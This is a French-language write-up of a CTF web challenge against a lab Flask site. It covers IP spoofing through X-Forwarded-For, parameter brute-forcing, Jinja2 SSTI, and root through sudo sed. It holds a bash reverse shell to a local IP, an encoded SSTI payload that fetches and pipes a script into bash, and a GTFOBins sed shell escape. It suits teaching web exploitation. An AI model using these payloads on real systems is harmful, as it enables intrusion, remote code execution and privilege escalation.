# Write-up du challenge WEB "La flasque"

## Avant de commencer

Dans ce rapport :
- 192.168.56.1 corresponds à ma machine locale
- 192.168.56.80 corresponds à la machine vulnérable

## Scanning & recon 

On commence par scanner la machiine pour connaitre les ports ouverts. Ici, je vais juste lancer un simple scan aggresif, avec l'argument `-A`, pour activer la détection d'OS et version, les scripts, et la traceroute:
```bash
$ nmap -A 192.168.56.80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 11:16 +07
Nmap scan report for vulnerrable.thm (192.168.56.80)
Host is up (0.00011s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/2e51aab2-8824-47a6-9492-2dd9d533644a
|_http-title: Flask'it
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
Nmap done: 1 IP address (1 host up) scanned in 6.35 second
```

On a donc affaire à une machine sous Linux, visiblement Ubuntu. Nmap n'a trouvé qu'1 seul port ouvert, et on dirait qu'il a déjà trouvé un endpoint pas commun, qui était renseigné dans le `/robots.txt`. On va visiter cette page après, mais pour le moment, visitons juste la page d'accueil du site:
 
![flaskit_website](https://user-images.githubusercontent.com/58345798/210207658-1f9c70b4-83a0-433f-9237-929020f742b0.png)

Hmm, rien d'intéressant ici: juste un site statique avec quelques images et pas mal de texte, quelque chose autour de bouteilles, de gourdes, et plus ou moins des flasques (flask ?). Une intuition, ou alors un wappalyzer pourrait nous dire qu'il s'agit d'un site en Flask, un micro framework en python pour le web. Pour ceux qui connaissent déjà ce micro-framework, sachez que Flask est une application WSGI (ou *Web Server Gateway Interface*, [plus d'informations ici](https://en.wikipedia.org/wiki/Web_Server_Gateway_Interfacehttps://en.wikipedia.org/wiki/Web_Server_Gateway_Interface)). Cela signifie que pour exécuter une application Flask, nous avons besoin d'un serveur WSGI, qui convertira les requêtes HTTP entrantes vers l'environnement WSGI standard et les réponses WSGI sortantes en réponses HTTP. Il est important de le savoir avant de continuer, car nous voyons ici que le site web est hébergé par un serveur Nginx. Il s'agit probablement d'une architecture avec un reverse proxy, où notre serveur HTTP est placé devant le serveur WSGI. Comprendre cela pourrait être utile pour la suite du défi… :)

Bon, assez parlé pour l'instant, continuons à hacker ce site ! Checker « /robots.txt » confirmera ce que nous avons obtenu lors de notre analyse nmap : il existe un endpoint caché:
```
$ curl http://192.168.56.80/robots.txt
User-agent: *
Disallow: /2e51aab2-8824-47a6-9492-2dd9d533644a
```

Maintenant, si on visite `/2e51aab2-8824-47a6-9492-2dd9d533644a` :
```bash
$ curl http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a
<!doctype html>
<html lang=en>
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>Only 127.0.0.1 can access this page</p>
```

Et là on a une erreur : *403 Forbidden* with a quite interesting message : "Only 127.0.0.1 can access this page". On dirait que pour bypasser cette protection, on va devoir se faire passer pour 127.0.0.1, et non pas 192.168.56.80, auprès du serveur (donc spoofer notre IP).

## Bypass de la 403

C'est là que mon petit blabla sur le reverse proxy devient utile ! Je m'explique : si ce site web est effectivement développé avec Flask, cela signifie que notre adresse IP doit passer par un proxy (Nginx ici) avant que WSGI ne reçoive quoi que ce soit. Il existe plusieurs façons de procéder, notamment en utilisant des en-têtes, comme « X-Forwarded-For » (un en-tête couramment utilisé à cet effet). Le proxy reçoit une requête du client, consulte son adresse IP et définit un en-tête contenant l'adresse IP de ce client dans la requête adressée au serveur WSGI. Pour connaître l'adresse IP du client, le serveur n'a plus qu'à vérifier la valeur de cet en-tête. Essayons de falsifier notre adresse IP en définissant l'en-tête « X-Forwarded-For » avec la valeur souhaitée, ici 127.0.0.1 : 
```bash
$ curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a
<!DOCTYPE html>
<html>
<head>
<title>Secret Page</title>
</head>
<body>
<p>Q2hlY2sgZm9yIGFueSBHRVQgcGFyYW1z</p>
</body>
</html>
```
Ça a marché ! Maintenant, on a une chaine de charactères encodé à l'intérieur de balises `<p>`, ça ressemble fort à du base64. On va essayer de décoder ça:
```bash
$ echo "Q2hlY2sgZm9yIGFueSBHRVQgcGFyYW1z" | base64 -d
Check for any GET params
```
Un super indice ça ! Bon c'est parti, essayons de trouver si un paramètre peut changer le comportement de notre page.

## Bruteforce des params GET

Si vous avez votre week-end libre et que vous ne savez pas quoi faire, vous pouvez essayer manuellement chaque paramètre potentiel. Je préfère ne pas le faire et utiliser un outil appelé « arjun » ([lien GitHub ici](https://github.com/s0md3v/Arjun)) qui me permettra de bruteforcer les params GET.
> Remarque : n'oubliez pas de redéfinir le header « X-Forwarded-For » ici aussi, pour éviter l'erreur 403 Forbidden.

```bash
$ arjun -u http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a --headers "X-Forwarded-For: 127.0.0.1"
_
/_| _ '
( |/ /(//) v2.2.1
_/

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: command, based on: body length
[+] Parameters found: command
```
`Arjun` found a parameter that changed the page's body length, interesting ! Let's see what this param really does: 
```bash
$ curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.56.80/2e51aab2-8824-47a6-9492-2dd9d533644a?command=test
<!DOCTYPE html>
 <html>
   <head>
     <title>Secret Page</title>
   </head>
   <body>
     <p>test</p>
   </body>
 </html>
```
La valeur du paramètre « command » se reflète sur la page ! Voyons si elle est vulnérable aux SSTI (Server-Side Template Injection). En supposant que notre site web fonctionne avec Flask, la syntaxe d'une injection de base ressemblerait à ceci : « {{6*7}} », ce qui exécuterait et afficherait « 42 » dans le modèle HTML.
> J'utiliserai Postman comme exemple, car c'est un moyen simple de spécifier l'en-tête « X-forwarded-For ». Cependant, burpsuite, les outils de développement de votre navigateur ou tout autre outil fonctionneraient parfaitement pour ce genre de manip. Vous pouvez également continuer à utiliser curl, mais n'oubliez pas d'échapper les caractères spéciaux ou d'encoder manuellement votre commande, car l'outil n'accepte que le format d'encodage URL.

![postman](https://user-images.githubusercontent.com/58345798/210207689-0f038a01-3c0e-4ad8-a504-d61ba062d680.png)

Bingo ! SSTI :)

## Exploiter la vuln

Aller, on va faire un tour sur notre repo github favori, aka [PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2), et on dirait qu'on peut avoir un RCE (Remote Code Execution) plutôt facilement, avec un reverse shell. 
On teste :

1. Notre script `revshell` qui sera téléchargé et exécuté sur la machine cible :
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/192.168.56.1/4000 0>&1"
```
2. On setup un serveur HTTP, pour pouvoir télécharger le script: 
```bash
$ python3 -m http.server 8000 # In the same directory as your revshell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
3. On ouvre le port 4000, en écoute pour recevoir la connection de notre `revshell`:
```bash
$ nc -lnvp 4000
Listening on 0.0.0.0 4000
```
4. On indique notre payload en valeur de notre param `?command=`, et on envoie la requête:
![Postman2](https://user-images.githubusercontent.com/58345798/210207722-be172d1d-03fd-4ed5-8569-4dca22832036.png)


Bon, on va devoir approfondir nos recherches pour trouver un payload qui contourne ce filtre spécifique. Une solution consiste à modifier notre payload à l'aide du filtre `attr()` de Jinja2, qui accepte le format hexadécimal.
Notre payload final ressemble à ça :
`{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 192.168.56.1:8000/revshell | bash")|attr("read")()}}`

On renvoie la requête... Et hop, on a notre shell ! 
```
flaskit@vuln-err-able:~$ whoami
flaskit
flaskit@vuln-err-able:~$ id
uid=1001(flaskit) gid=1001(flaskit) groups=1001(flaskit),27(sudo),33(www-data)
```
On est connecté en tant que simple user, `flaskit`, et sans avoir à trop explorer on trouve le flag user : 
```
flaskit@vuln-err-able:~$ cat user.txt
f7a03995bcbfb00971314293eeac7202
```

## All the way up to root

Plus qu'à devenir root. L'une des premières choses qui devrait venir à l'esprit lorsqu'on parle de privesc linux c'est de vérifier la conf sudo. 
```
flaskit@vuln-err-able:~$ sudo -l
Matching Defaults entries for flaskit on vuln-err-able:
env_reset, exempt_group=sudo, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
User flaskit may run the following commands on vuln-err-able:
(ALL : ALL) ALL
(ALL) NOPASSWD: /bin/sed
```

Et voilà, c'est fini. On peut exécuter la commande `sed` en tant que super utilisateur via sudo. On fait un tour sur [GTFOBins](https://gtfobins.github.io/), et on trouve ([cette page](https://gtfobins.github.io/gtfobins/sed/)) qui dit comment utiliser `sed` pour spawn un shell !


```
flaskit@vuln-err-able:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
id
uid=0(root) gid=0(root) groups=0(root)
```
Et voilà! Fin du challenge, dans `/root`, on n'a plus qu'à lire fièrement le contenu de `root.txt`.
```
cat root.txt
bf2ae566e364a905320c401ef95528cd
```

### Ressources 
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- https://www.synacktiv.com/en/publications/cve-2022-31813-forwarding-addresses-is-hard.html
- https://stackoverflow.com/questions/12770950/flask-request-remote-addr-is-wrong-on-webfaction-and-not-showing-real-user-ip
- https://0day.work/jinja2-template-injection-filter-bypasses/
- https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
